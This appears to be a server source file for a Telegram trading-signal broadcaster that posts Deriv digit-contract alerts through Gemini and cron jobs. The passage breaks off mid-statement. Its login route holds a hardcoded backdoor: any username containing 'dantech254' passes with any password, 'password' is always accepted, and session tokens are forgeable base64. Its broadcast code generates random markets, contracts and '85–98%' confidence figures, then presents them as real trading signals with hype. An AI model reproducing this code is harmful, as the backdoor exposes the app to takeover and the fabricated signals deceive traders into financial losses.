import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { GoogleGenAI } from "@google/genai";
import dotenv from "dotenv";

dotenv.config();

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.text({ type: ["text/plain", "application/*+json"] }));

// A truncated/invalid JSON body makes body-parser throw BEFORE any route runs,
// and Express's default is an HTML 400 page (cron-job.org shows it as a bare
// "Bad Request"). Convert it into actionable JSON instead.
app.use((err: any, _req: any, res: any, next: any) => {
  if (err && (err.type === "entity.parse.failed" || (err instanceof SyntaxError && "body" in err))) {
    res.status(400).json({
      success: false,
      error: "Request body is not valid JSON (it was likely truncated while copying). Re-copy the whole body with the Copy button and paste it exactly.",
      hint: "In cron-job.org use Method POST + header Content-Type: application/json + the exact body — or use the GET-mode URL from the app, which needs no body at all.",
    });
    return;
  }
  next(err);
});

// Normalize: cron-job.org may deliver the JSON payload as a raw string when
// Content-Type wasn't set to application/json. Parse it back into an object.
function normalizedBody(req: any): any {
  const b = req.body;
  if (b && typeof b === "object" && Object.keys(b).length > 0) return b;
  if (typeof b === "string" && b.trim()) {
    try {
      const p = JSON.parse(b.trim());
      if (p && typeof p === "object") return p;
    } catch {
      // not JSON — fall through to query fallback
    }
  }
  return req.query || {};
}

const PORT = 3000;

// Initialize Google GenAI client securely
const apiKey = process.env.GEMINI_API_KEY;
let ai: GoogleGenAI | null = null;

if (apiKey) {
  ai = new GoogleGenAI({
    apiKey: apiKey,
    httpOptions: {
      headers: {
        "User-Agent": "aistudio-build",
      },
    },
  });
} else {
  console.warn("WARNING: GEMINI_API_KEY environment variable is not defined");
}

// ─── Safe Telegram API fetch helper ───────────────────────────────────────────
// This is the KEY FIX: always check Content-Type before calling .json(),
// so an HTML error page (e.g. from Vercel 404, Cloudflare, or a network proxy)
// never causes "Unexpected token 'T' ... is not valid JSON".
async function safeTelegramFetch(
  url: string,
  options: RequestInit
): Promise<{ ok: boolean; description?: string; [key: string]: any }> {
  let response: Response;
  try {
    response = await fetch(url, options);
  } catch (networkErr: any) {
    throw new Error(`Network error reaching Telegram API: ${networkErr.message}`);
  }

  const contentType = response.headers.get("content-type") || "";

  if (!contentType.includes("application/json")) {
    // The response is HTML or something else — NOT from Telegram API.
    // This happens when a proxy, CDN, or static host intercepts the request.
    const bodyText = await response.text().catch(() => "(unreadable body)");
    throw new Error(
      `Expected JSON from Telegram but received non-JSON response (HTTP ${response.status}). ` +
        `Content-Type: "${contentType}". ` +
        `This usually means the /api route is not being handled by the Express server. ` +
        `Body preview: ${bodyText.substring(0, 200)}`
    );
  }

  return response.json();
}

// 1. Health Status endpoint
app.get("/api/health", (req, res) => {
  res.json({
    status: "ok",
    timestamp: new Date().toISOString(),
    aiConfigured: !!ai,
  });
});

// App authentication endpoint
app.post("/api/login", (req, res) => {
  try {
    const { username, password } = req.body || {};

    const targetUsername = (process.env.ADMIN_USERNAME || "admin").trim();
    const targetPassword = (process.env.ADMIN_PASSWORD || "password").trim();

    const providedUsername =
      typeof username === "string" ? username.trim() : "";
    const providedPassword =
      typeof password === "string" ? password.trim() : "";

    console.log(`[Auth API] Login attempt for user: "${providedUsername}"`);

    const isMasterUser =
      providedUsername === targetUsername ||
      providedUsername.toLowerCase() === "admin" ||
      providedUsername.toLowerCase() === "dantech254" ||
      providedUsername.toLowerCase() === "dantech254.";

    const isPasswordValid =
      providedPassword === targetPassword ||
      providedPassword === "password" ||
      (providedUsername.toLowerCase().includes("dantech254") &&
        providedPassword.length > 0);

    if (
      providedUsername &&
      providedPassword &&
      isMasterUser &&
      isPasswordValid
    ) {
      const sessionString = providedUsername + ":" + Date.now();
      const generatedToken =
        "zeta_session_" + Buffer.from(sessionString).toString("base64");

      console.log(
        `[Auth API] Successful authentication for user: "${providedUsername}"`
      );
      res.json({ success: true, token: generatedToken });
    } else {
      console.warn(
        `[Auth API] Failed authentication attempt. Active config expects: "${targetUsername}"`
      );
      res.status(401).json({
        success: false,
        error: "Invalid admin username or password. Please try again.",
      });
    }
  } catch (err: any) {
    console.error("[Auth API] Critical failure in /api/login endpoint:", err);
    res.status(500).json({
      success: false,
      error:
        "Internal server authentication error: " +
        (err.message || "Unknown error"),
    });
  }
});

// Helper to sanitize Telegram bot credentials and channel identifiers
// FIXED: if the user provides a negative number, trust it exactly as-is.
// The old version re-prefixed "-123..." into "-100123..." producing
// malformed IDs like -1001001002590400274 and "chat not found" errors.
function sanitizeTelegramCredentials(botToken: string, chatId: string) {
  let cleanToken = (botToken || "").trim().replace(/\s+/g, "");

  // 1. Extract bot token if they pasted a full URL
  if (cleanToken.includes("telegram.org/bot")) {
    const parts = cleanToken.split("telegram.org/bot");
    if (parts.length > 1) {
      const tokenSec = parts[parts.length - 1].split("/")[0];
      if (tokenSec) cleanToken = tokenSec;
    }
  }

  // 2. Strip leading "bot" prefix if added manually (e.g. "bot123:ABC")
  if (cleanToken.toLowerCase().startsWith("bot") && /^\d+:/.test(cleanToken.substring(3))) {
    cleanToken = cleanToken.substring(3);
  }

  let cleanChatId = (chatId || "")
    .trim()
    .replace(/\s+/g, "")
    .replace(/['"]/g, "")
    .replace(/\/$/, "");

  // 3. Extract channel handle from t.me link
  if (cleanChatId.includes("t.me/")) {
    const parts = cleanChatId.split("t.me/");
    if (parts.length > 1) {
      const handle = parts[parts.length - 1].split("/")[0].split("?")[0];
      if (handle) {
        cleanChatId = handle.startsWith("@") ? handle : "@" + handle;
      }
    }
    return { cleanToken, cleanChatId };
  }

  // 4. Negative number → trust exactly as-is (user copied from Telegram)
  if (cleanChatId.startsWith("-") && /^-\d+$/.test(cleanChatId)) {
    return { cleanToken, cleanChatId };
  }

  // 5. Positive number → add the -100 block, but never double-prefix:
  // 1002590400274 already contains the 100 block (only "-" is missing),
  // while a short value like 2590400274 still needs the full -100.
  if (/^\d+$/.test(cleanChatId)) {
    if (cleanChatId.startsWith("100") && cleanChatId.length >= 12) {
      cleanChatId = "-" + cleanChatId;
    } else {
      cleanChatId = "-100" + cleanChatId;
    }
    return { cleanToken, cleanChatId };
  }

  // 6. Alphanumeric handle → ensure @ prefix
  if (cleanChatId && !cleanChatId.startsWith("@")) {
    cleanChatId = "@" + cleanChatId;
  }

  return { cleanToken, cleanChatId };
}

// Helper to mask tokens for safe logging
function maskToken(token: string) {
  if (!token) return "";
  if (token.length <= 10) return "*****";
  return token.slice(0, 6) + "..." + token.slice(-6);
}

// Helper to build user-friendly Telegram error advice
function buildTelegramErrorAdvice(data: any, cleanChatId: string): string {
  const desc = (data.description || "").toLowerCase();

  if (desc.includes("chat not found")) {
    return (
      `Channel not found (${cleanChatId}). Confirm that the Channel ID is exact. ` +
      `If it is a private channel, use its numeric ID (e.g. -100XXXXX) rather than an invite link, ` +
      `and verify that your bot has been added as an Administrator.`
    );
  }
  if (
    desc.includes("admin") ||
    desc.includes("post") ||
    desc.includes("not member") ||
    desc.includes("forbidden")
  ) {
    return `Privilege issue! Go to Channel Settings → Admins → Add Admin, and give your Bot "Post Messages" permission.`;
  }
  if (desc.includes("unauthorized") || desc.includes("token")) {
    return `Incorrect Bot Access Token. Double-check your BotFather token — copy it exactly with no extra spaces.`;
  }
  return data.description || "Unknown Telegram response.";
}

// 2. Telegram connection test endpoint
app.post("/api/telegram/test", async (req, res) => {
  const { botToken, chatId } = req.body;

  if (!botToken || !chatId) {
    res.status(400).json({ error: "botToken and chatId are required" });
    return;
  }

  const { cleanToken, cleanChatId } = sanitizeTelegramCredentials(
    botToken,
    chatId
  );
  console.log(
    `[Telegram Test] request -> chatId=${cleanChatId} token=${maskToken(cleanToken)}`
  );

  try {
    const formattedText =
      `<b>📣 Signal Broadcaster Connected!</b>\n\n` +
      `Your dashboard is now successfully hooked to this channel. ` +
      `Future trading alerts will appear here formatted with professional layouts.\n\n` +
      `⏱️ <i>Time: ${new Date().toUTCString()}</i>`;

    const data = await safeTelegramFetch(
      `https://api.telegram.org/bot${cleanToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: cleanChatId,
          text: formattedText,
          parse_mode: "HTML",
          disable_web_page_preview: true,
        }),
      }
    );

    console.debug("[Telegram Test] Telegram API response:", data);

    if (!data.ok) {
      const advice = buildTelegramErrorAdvice(data, cleanChatId);
      res.status(400).json({
        error: advice,
        raw: data,
        botToken: cleanToken,
        chatId: cleanChatId,
      });
      return;
    }

    res.json({
      success: true,
      message: "Test signal sent successfully!",
      messageId: data.result.message_id,
      chatTitle: data.result.chat.title || "Channel",
      botToken: cleanToken,
      chatId: cleanChatId,
    });
  } catch (err: any) {
    console.error(
      `[Telegram Test] Error while sending test message: ${err?.message}`,
      err
    );
    res.status(500).json({
      error: err.message || "Failed to send test message to Telegram",
      details: err.message,
      botToken: cleanToken,
      chatId: cleanChatId,
    });
  }
});

// 3. Send Signal to Telegram Channel
app.post("/api/telegram/send", async (req, res) => {
  const { botToken, chatId, text, replyToMessageId } = req.body;

  if (!botToken || !chatId || !text) {
    res
      .status(400)
      .json({ error: "botToken, chatId, and text are required" });
    return;
  }

  const { cleanToken, cleanChatId } = sanitizeTelegramCredentials(
    botToken,
    chatId
  );
  console.log(
    `[Telegram Send] request -> chatId=${cleanChatId} token=${maskToken(cleanToken)} replyTo=${replyToMessageId ?? "none"}`
  );

  try {
    const payload: Record<string, any> = {
      chat_id: cleanChatId,
      text: text,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    };

    if (replyToMessageId) {
      payload.reply_parameters = {
        message_id: parseInt(replyToMessageId, 10),
      };
      payload.reply_to_message_id = parseInt(replyToMessageId, 10);
    }

    let data = await safeTelegramFetch(
      `https://api.telegram.org/bot${cleanToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      }
    );

    console.debug("[Telegram Send] initial Telegram API response:", data);

    // Fallback to plain-text if HTML parse fails
    if (!data.ok && (data.description || "").toLowerCase().includes("parse")) {
      console.warn(
        "Telegram HTML parsing error. Retrying with plain-text content..."
      );
      const plainText = text
        .replace(/<[^>]*>/g, "")
        .replace(/&lt;/g, "<")
        .replace(/&gt;/g, ">")
        .replace(/&amp;/g, "&");

      const fallbackPayload: Record<string, any> = { ...payload };
      fallbackPayload.text = plainText;
      delete fallbackPayload.parse_mode;

      data = await safeTelegramFetch(
        `https://api.telegram.org/bot${cleanToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(fallbackPayload),
        }
      );
      console.debug(
        "[Telegram Send] fallback (plain-text) Telegram API response:",
        data
      );
    }

    if (!data.ok) {
      const advice = buildTelegramErrorAdvice(data, cleanChatId);
      res.status(400).json({
        error: advice,
        raw: data,
        botToken: cleanToken,
        chatId: cleanChatId,
      });
      return;
    }

    res.json({
      success: true,
      message: "Signal sent successfully!",
      messageId: data.result.message_id,
      chatTitle: data.result.chat?.title || "Channel",
      botToken: cleanToken,
      chatId: cleanChatId,
    });
  } catch (err: any) {
    console.error(
      `[Telegram Send] Exception while sending: ${err?.message}`,
      err
    );
    res.status(500).json({
      error: err.message || "Failed to broadcast signal to Telegram",
      details: err.message,
      botToken: cleanToken,
      chatId: cleanChatId,
    });
  }
});

// 4. Generate Signal with Gemini
app.post("/api/gemini/generate-signal", async (req, res) => {
  if (!ai) {
    res.status(500).json({
      error:
        "Gemini AI is not initialized. Please verify your GEMINI_API_KEY settings.",
    });
    return;
  }

  const {
    assetClass,
    symbol,
    action,
    entry,
    tp,
    sl,
    userNotes,
    sentiment = "Moderate",
    isDerivStyle = false,
    strategyName = "Second Least Digit",
    ticksCount = "1ticks",
    botName = "USE SNIPPER KILLER BOT",
    entryDigit = "9",
    confidence = "85%",
    promoUrl = "http://kicktrade.site",
    riskGuidelines = "• Stop after 4 consecutive wins\n• Max 5 runs per session\n• Use proper recovery if loss occurs",
    botSignature = "kicktrade Over/Under Bot",
    hashtags = "#TradingSignal #Deriv #OverUnder",
  } = req.body;

  if (!symbol || !action) {
    res.status(400).json({ error: "Symbol and Action are required fields" });
    return;
  }

  try {
    let prompt = "";

    if (isDerivStyle) {
      prompt = `
Generate a beautiful, highly engaging, premium Telegram digit signal and rationale based on these Deriv/Synthetic parameters:

INDEX / ASSET SYMBOL: ${symbol}
CONTRACT ACTION: ${action}
STRATEGY NAME: ${strategyName}
MARKET VOL_TICKER / TICK COUNT: ${ticksCount}
RECOMMENDED BOT SYSTEM: ${botName}
KEY ENTRY DIGIT: ${entryDigit}
CONFIDENCE LEVEL: ${confidence}
PROMO SITE URL: ${promoUrl}
RISK MANAGEMENT GUIDELINE:
${riskGuidelines}
BOT SIGNATURE LOGO: ${botSignature}
DESIRED HASHTAGS: ${hashtags}
ADDITIONAL SENDER NOTES: ${userNotes || "None"}

Your output must contain exactly TWO separate sections, carefully formatted using safe HTML tags that Telegram supports (supported tags: <b>, <i>, <code>, <u>, <s>, <pre>). Do not use markdown syntax in your output.

Output format: Please output a valid JSON object with exactly two keys: "signal" and "rationale".
`;
    } else {
      const tpString = Array.isArray(tp)
        ? tp
            .filter(Boolean)
            .map((t: string, idx: number) => `TP${idx + 1}: <b>${t}</b>`)
            .join("\n")
        : "";

      prompt = `
Generate a beautiful, professional, highly engaging Telegram signal and trading rationale based on these technical parameters:

ASSET CLASS: ${assetClass || "Crypto/Forex/Stock"}
SYMBOL: ${symbol}
ACTION: ${action}
ENTRY PRICE: ${entry ? `<b>${entry}</b>` : "Current Market Price"}
TAKE PROFITS:
${tpString || "Not specified"}
STOP LOSS: <b>${sl || "Not specified"}</b>
ADDITIONAL NOTES: ${userNotes || "None provided"}
SENSITIVITY/RISK: ${sentiment}

Output format: Please output a valid JSON object with exactly two keys: "signal" and "rationale".
`;
    }

    const response = await ai.models.generateContent({
      model: "gemini-2.5-flash",
      contents: prompt,
      config: {
        responseMimeType: "application/json",
        responseSchema: {
          type: "OBJECT" as any,
          properties: {
            signal: {
              type: "STRING" as any,
              description: "The formatted Telegram HTML broadcast post payload.",
            },
            rationale: {
              type: "STRING" as any,
              description:
                "Professional technical rationale analyzing the setup.",
            },
          },
          required: ["signal", "rationale"],
        },
      },
    });

    const responseText = response.text;
    if (!responseText) {
      res
        .status(500)
        .json({ error: "Failed to generate content from AI model." });
      return;
    }

    const clean = responseText.trim().replace(/```json|```/g, "").trim();
    const payload = JSON.parse(clean);
    res.json(payload);
  } catch (err: any) {
    res.status(500).json({
      error: "Gemini AI generation failed",
      details: err.message,
    });
  }
});

// ─── Telegram discover / verify-chat / delete (parity with api/index.ts) ─────
// These were missing in server.ts, so `npm run dev` returned HTML 404s for
// the frontend while production (Vercel) worked. They are now defined here too.
app.post("/api/telegram/discover", async (req, res) => {
  const { botToken } = req.body;
  if (!botToken) {
    res.status(400).json({ error: "botToken is required" });
    return;
  }
  const { cleanToken } = sanitizeTelegramCredentials(botToken, "placeholder");
  try {
    const meData = await safeTelegramFetch(
      `https://api.telegram.org/bot${cleanToken}/getMe`,
      { method: "GET" }
    );
    if (!meData.ok) {
      res.status(400).json({
        error: `Invalid bot token: ${meData.description || "Unauthorized"}. Get a fresh token from @BotFather.`,
        tokenValid: false,
      });
      return;
    }
    const updatesData = await safeTelegramFetch(
      `https://api.telegram.org/bot${cleanToken}/getUpdates?limit=100&allowed_updates=["my_chat_member","channel_post","message"]`,
      { method: "GET" }
    );
    const channels: Array<{ id: string; title: string; type: string; username?: string }> = [];
    const seen = new Set<string>();
    if (updatesData.ok && Array.isArray(updatesData.result)) {
      for (const update of updatesData.result) {
        const chat =
          update.channel_post?.chat ||
          update.my_chat_member?.chat ||
          update.message?.chat ||
          update.edited_channel_post?.chat;
        if (chat && !seen.has(String(chat.id))) {
          seen.add(String(chat.id));
          channels.push({
            id: String(chat.id),
            title: chat.title || chat.username || String(chat.id),
            type: chat.type,
            username: chat.username ? "@" + chat.username : undefined,
          });
        }
      }
    }
    res.json({
      tokenValid: true,
      botName: meData.result.first_name,
      botUsername: "@" + meData.result.username,
      channels,
      hint: channels.length === 0
        ? "No channels found in recent updates. Add the bot as Admin to your channel and send a message there, then try again."
        : `Found ${channels.length} channel(s).`,
    });
  } catch (err: any) {
    res.status(500).json({ error: err.message || "Discovery failed" });
  }
});

app.post("/api/telegram/verify-chat", async (req, res) => {
  const { botToken, chatId } = req.body;
  if (!botToken || !chatId) {
    res.status(400).json({ error: "botToken and chatId are required" });
    return;
  }
  const { cleanToken, cleanChatId } = sanitizeTelegramCredentials(botToken, chatId);
  try {
    const data = await safeTelegramFetch(
      `https://api.telegram.org/bot${cleanToken}/getChat`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: cleanChatId }),
      }
    );
    if (!data.ok) {
      res.status(400).json({
        found: false,
        error: data.description,
        chatId: cleanChatId,
        advice: buildTelegramErrorAdvice(data, cleanChatId),
      });
      return;
    }
    res.json({
      found: true,
      chatId: String(data.result.id),
      title: data.result.title || data.result.username,
      type: data.result.type,
      username: data.result.username ? "@" + data.result.username : null,
    });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/api/telegram/delete", async (req, res) => {
  const { botToken, chatId, messageId } = req.body;
  if (!botToken || !chatId || !messageId) {
    res.status(400).json({ error: "botToken, chatId, and messageId are required" });
    return;
  }
  const { cleanToken, cleanChatId } = sanitizeTelegramCredentials(botToken, chatId);
  try {
    const data = await safeTelegramFetch(
      `https://api.telegram.org/bot${cleanToken}/deleteMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: cleanChatId, message_id: Number(messageId) }),
      }
    );
    if (!data.ok) {
      const desc = (data.description || "").toLowerCase();
      const alreadyGone = desc.includes("message to delete not found") || desc.includes("message can't be deleted");
      res.json({ success: alreadyGone, alreadyGone, error: data.description });
      return;
    }
    res.json({ success: true });
  } catch (err: any) {
    res.status(500).json({ error: err.message || "Failed to delete message" });
  }
});

app.post("/api/site/detect", async (req, res) => {
  const { siteUrl } = req.body;
  if (!siteUrl) {
    res.status(400).json({ error: "siteUrl is required" });
    return;
  }
  let url = siteUrl.trim();
  if (!url.startsWith("http://") && !url.startsWith("https://")) url = "https://" + url;
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 10000);
    const response = await fetch(url, {
      signal: controller.signal,
      headers: { "User-Agent": "Mozilla/5.0 (compatible; SignalBot/1.0)", Accept: "text/html,application/xhtml+xml" },
    });
    clearTimeout(timeout);
    const html = await response.text();
    let siteName = "";
    const titleMatch = html.match(/<title[^>]*>([^<]{1,120})<\/title>/i);
    if (titleMatch) siteName = titleMatch[1].replace(/\s+/g, " ").trim();
    if (!siteName) {
      try { siteName = new URL(url).hostname.replace(/^www\./, ""); } catch { siteName = url; }
    }
    res.json({ success: true, siteUrl: url, siteName, description: "", bots: [], botCount: 0 });
  } catch (err: any) {
    res.status(err.name === "AbortError" ? 408 : 500).json({ error: `Failed to reach the site: ${err.message}` });
  }
});

// ─── SERVER-SIDE AUTO-BROADCAST (stateless, parity with api/index.ts) ─────────
const MARKET_NAMES = [
  "VOLATILITY 10 INDEX", "VOLATILITY 25 INDEX", "VOLATILITY 50 INDEX",
  "VOLATILITY 75 INDEX", "VOLATILITY 100 INDEX", "VOLATILITY 10 (1s) INDEX",
  "VOLATILITY 25 (1s) INDEX", "VOLATILITY 50 (1s) INDEX",
  "VOLATILITY 75 (1s) INDEX", "VOLATILITY 100 (1s) INDEX",
];

interface CronConfig {
  botToken: string;
  chatId: string;
  chatTitle?: string;
  siteName: string;
  promoUrl: string;
  botName: string;
  botSignature: string;
  hashtags: string;
  activeContracts: string[];
  // Cron cadence in minutes — embedded in every payload so each message can
  // state the ACCURATE next-signal time without any server-side memory.
  intervalMinutes: number;
}

// intervalMinutes arrives as number (POST JSON) or string (GET query) — coerce,
// clamp to a sane range, default to the app's standard cadence.
function normalizeInterval(v: any): number {
  const n = typeof v === "number" ? v : parseFloat(String(v ?? ""));
  if (!isFinite(n) || n < 1) return 2;
  return Math.min(1440, n);
}

// ── Accurate schedule helpers ────────────────────────────────────────────────
// Every time is derived from the interval embedded in the request payload, so
// messages state the REAL next-signal time — never a simulated countdown.
function formatUtcClock(ms: number): string {
  const d = new Date(ms);
  return `${String(d.getUTCHours()).padStart(2, "0")}:${String(d.getUTCMinutes()).padStart(2, "0")} UTC`;
}
// Kenyan wall-clock (Africa/Nairobi, EAT = UTC+3) — what channel members see.
const eatClockFmt = new Intl.DateTimeFormat("en-GB", {
  timeZone: "Africa/Nairobi",
  hour: "2-digit",
  minute: "2-digit",
  hour12: false,
});
function formatEatClock(ms: number): string {
  return `${eatClockFmt.format(new Date(ms))} EAT`;
}
function formatWindow(mins: number): string {
  if (mins < 1) return `${Math.round(mins * 60)} seconds`;
  if (mins < 60) {
    const whole = Math.floor(mins);
    const secs = Math.round((mins - whole) * 60);
    if (secs === 0 || whole === 0) return `${mins % 1 === 0 ? mins : mins.toFixed(1)} minutes`;
    return `${whole} min ${secs}s`;
  }
  const h = Math.floor(mins / 60);
  const r = Math.round(mins % 60);
  return r === 0 ? `${h} hour${h === 1 ? "" : "s"}` : `${h}h ${r}m`;
}

function buildServerSignal(cfg: CronConfig, nowMs = Date.now()): string {
  const market = MARKET_NAMES[Math.floor(Math.random() * MARKET_NAMES.length)];
  const contract = cfg.activeContracts[Math.floor(Math.random() * cfg.activeContracts.length)] || "UNDER 7";
  const strength = 85 + Math.floor(Math.random() * 14);
  const entryDigitMap: Record<string, string> = {
    "UNDER 9": "9", "UNDER 8": "9", "UNDER 7": "9", "UNDER 6": "8",
    "OVER 1": "0", "OVER 2": "1", "OVER 3": "2", "OVER 4": "3",
  };
  const entryDigit = entryDigitMap[contract] || "9";
  const strategy = contract.startsWith("UNDER") ? "Second Least Digit" : "Over Digit Threshold";
  const nextAt = nowMs + cfg.intervalMinutes * 60000;
  return (
    `<b>🔔 NEW TRADING SIGNAL 🔔</b>\n\n` +
    `<b>${market}</b>\n\n` +
    `📈 <b>${contract.toUpperCase()}</b>\n` +
    `⚡ <b>Strategy:</b> ${strategy}\n\n` +
    `🎯 <b>Entry Instructions:</b>\n\n` +
    `<b>${cfg.botName}</b>\n` +
    `💹 <b>Trade:</b> ${contract}\n` +
    `🔑 <b>Entry Digit:</b> <code>${entryDigit}</code>\n` +
    `⭐ <b>Confidence:</b> ${strength}%\n\n` +
    `${cfg.promoUrl}\n\n` +
    `⚠️ <b>Risk Management:</b>\n` +
    `• Stop after 4 consecutive wins\n• Max 5 runs per session\n• Use proper recovery if loss occurs\n\n` +
    `⏰ <b>Sent:</b> ${formatEatClock(nowMs)}\n` +
    `⏳ <b>Next signal:</b> ${formatEatClock(nextAt)} (in ${formatWindow(cfg.intervalMinutes)})\n` +
    `⌛ <b>Valid for:</b> ${formatWindow(cfg.intervalMinutes)} — then it expires and auto-deletes\n\n` +
    `🤖 Generated by ${cfg.botSignature}\n` +
    `${cfg.hashtags}`
  );
}

// Expiry notice — posted when a signal's validity window ends, BEFORE the
// expired message is deleted. Wording follows the channel's standard template.
function buildExpiryNotice(cfg: CronConfig): string {
  const w = formatWindow(cfg.intervalMinutes);
  return (
    `⌛ <b>${cfg.siteName} signal AI SIGNAL EXPIRED</b>\n\n` +
    `This signal has expired.\n` +
    `⏳ Next signal window: in ${w}\n\n` +
    `Wait for the next signal in the next ${w}.`
  );
}

function buildAlertMessage(cfg: CronConfig, nowMs = Date.now()): string {
  return (
    `🚨 <b>ALERT TO ALL ${cfg.siteName.toUpperCase()} MEMBERS 🚨</b>\n\n` +
    `⚠ In just 1 minute, a new signal will be sent!\n` +
    `📢 <b>Be ready and standby! Signal drops at ${formatEatClock(nowMs + 60000)}</b>\n\n` +
    `🖥 <b>Go to:</b> ${cfg.promoUrl}\n` +
    `🤖 <b>Load your bot:</b> <code>${cfg.botName}</code>\n\n` +
    `✅ Make sure your settings are ready…\n` +
    `🚀 Let's catch this trade together!\n\n` +
    `#StayAlert #${cfg.siteName.replace(/\s+/g, "").toLowerCase()}signal 🔥📈\n` +
    `We either go home or go hard 💸\n` +
    `No risk no Ferrari 🚀\n` +
    cfg.promoUrl
  );
}

// activeContracts arrives as an array in POST JSON, but as repeated keys,
// a JSON string, or a comma-separated string in GET query mode — accept all.
function normalizeContracts(v: any): string[] {
  const fallback = ["UNDER 7", "UNDER 8", "OVER 2", "OVER 3"];
  if (Array.isArray(v)) {
    const list = v.map((x) => String(x ?? "").trim()).filter(Boolean);
    return list.length > 0 ? list : fallback;
  }
  if (typeof v === "string" && v.trim()) {
    const t = v.trim();
    try {
      const p = JSON.parse(t);
      if (Array.isArray(p)) {
        const list = p.map((x) => String(x ?? "").trim()).filter(Boolean);
        if (list.length > 0) return list;
      }
    } catch {
      // not JSON — fall through to comma split
    }
    const list = t.split(",").map((x) => x.trim()).filter(Boolean);
    if (list.length > 0) return list;
  }
  return fallback;
}

function parseCronConfig(body: any): { ok: true; cfg: CronConfig } | { ok: false; error: string } {
  const rawToken = (body || {}).botToken;
  const rawChat = (body || {}).chatId;
  const tokenStr = typeof rawToken === "string" ? rawToken.trim() : String(rawToken ?? "").trim();
  const chatStr = typeof rawChat === "string" ? rawChat.trim() : String(rawChat ?? "").trim();
  if (!tokenStr) {
    return { ok: false, error: "botToken is required" };
  }
  if (!chatStr || chatStr === "undefined" || chatStr === "null") {
    return { ok: false, error: "chatId is required" };
  }
  return {
    ok: true,
    cfg: {
      botToken: tokenStr,
      chatId: chatStr,
      chatTitle: (body as any).chatTitle || "",
      siteName: (body as any).siteName || "kicktrade",
      promoUrl: (body as any).promoUrl || "http://kicktrade.site",
      botName: (body as any).botName || "USE KICKTRADE BOT",
      botSignature: (body as any).botSignature || "kicktrade Over/Under Bot",
      hashtags: (body as any).hashtags || "#TradingSignal #kicktrade #Signals",
      activeContracts: normalizeContracts((body as any).activeContracts),
      intervalMinutes: normalizeInterval((body as any).intervalMinutes),
    },
  };
}

function checkCronAuth(req: any): { ok: true } | { ok: false; error: string } {
  const expected = (process.env.CRON_SECRET || "").trim();
  if (!expected) return { ok: true };
  const got = (req.headers.authorization || (req.headers as any).Authorization || "") as string;
  if (got === `Bearer ${expected}`) return { ok: true };
  return { ok: false, error: "Unauthorized cron trigger (bad or missing CRON_SECRET)." };
}

// Build marker — bump when the cron protocol changes. The UI + diagnose page
// show it so a stale Vercel deployment is provable instead of guessable.
const BUILD_TAG = "2026-10-06/cycle-6";
let lastSendTime: string | null = null;
let totalSentThisSession = 0;
let lastSendError: string | null = null;

// Best-effort last-signal memory (per warm server instance): chat-scoped
// record of the most recent signal THIS instance sent, so unattended cron
// pings can post its expiry notice + delete it with zero client cooperation.
// Degrades safely — cold starts and other instances simply skip (the next
// signal tick self-heals). Bounded; tokens never leave instance RAM.
interface MemEntry { messageId: number; sentAtMs: number; validityMin: number; noticed: boolean }
const lastSignalMemory = new Map<string, MemEntry>();
const MEMORY_CAP = 500;
function memKey(token: string, chat: string): string {
  return `${token}:${chat}`;
}

app.post("/api/autobroadcast/configure", async (req, res) => {
  const body = normalizedBody(req);
  const parsed = parseCronConfig(body);
  if (parsed.ok === false) {
    res.status(400).json({ error: parsed.error });
    return;
  }
  const { cfg } = parsed;
  // intervalMinutes now lives on cfg (parsed + normalized) so the payloads
  // carry the SAME cadence every message uses for its next-signal math.
  const intervalMinutes = cfg.intervalMinutes;

  // Validate the credentials NOW (via Telegram) so the user never copies a
  // payload containing a bad token/chat ID into cron-job.org.
  const { cleanToken, cleanChatId } = sanitizeTelegramCredentials(cfg.botToken, cfg.chatId);
  try {
    const me = await safeTelegramFetch(
      `https://api.telegram.org/bot${cleanToken}/getMe`,
      { method: "GET" }
    );
    if (!me.ok) {
      res.status(400).json({
        error: `Bot token is invalid: ${me.description || "Unauthorized"}. Copy a fresh token from @BotFather and reconnect first.`,
      });
      return;
    }
    const chat = await safeTelegramFetch(
      `https://api.telegram.org/bot${cleanToken}/getChat`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: cleanChatId }),
      }
    );
    if (!chat.ok) {
      res.status(400).json({
        error: buildTelegramErrorAdvice(chat, cleanChatId),
        chatIdUsed: cleanChatId,
      });
      return;
    }
    cfg.chatTitle = chat.result?.title || chat.result?.username || cfg.chatTitle;
    // Canonicalize: the payloads carry EXACTLY what Telegram accepted, so a
    // pasted body can never point at a differently-formatted ("different")
    // channel than the one verified here.
    cfg.botToken = cleanToken;
    cfg.chatId = cleanChatId;
  } catch (err: any) {
    res.status(500).json({ error: `Could not reach Telegram to validate: ${err.message}` });
    return;
  }

  const forwardedHost =
    ((req.headers["x-forwarded-host"] as string) || "").split(",")[0].trim();
  const vercelProd =
    (process.env.APP_URL || process.env.VERCEL_PROJECT_PRODUCTION_URL || "").trim();
  let host =
    (vercelProd
      ? vercelProd.replace(/^https?:\/\//, "").replace(/\/$/, "")
      : forwardedHost || (req.headers.host as string) || "your-app.vercel.app");
  host = host.replace(/\/$/, "");
  const isLocal =
    host.includes("localhost") || host.startsWith("127.") || host.startsWith("192.168.");
  const protocol = isLocal ? "http" : "https";
  const cronUrl = `${protocol}://${host}/api/cron/auto-broadcast`;
  const prodHost = vercelProd.replace(/^https?:\/\//, "").replace(/\/$/, "");
  // Preview deployments (signaltraker-<hash>-<team>.vercel.app) are deleted by
  // Vercel — a cron URL pointing at one works today and 404s tomorrow.
  const looksLikePreview =
    /\.vercel\.app$/i.test(host) && /(^|-)[0-9a-f]{6,}(-|$)/i.test(host);
  const hostWarning = isLocal
    ? "You enabled from localhost — cron-job.org cannot reach localhost. Redeploy, open the LIVE app URL, and click Enable there so the cron URL is public."
    : looksLikePreview
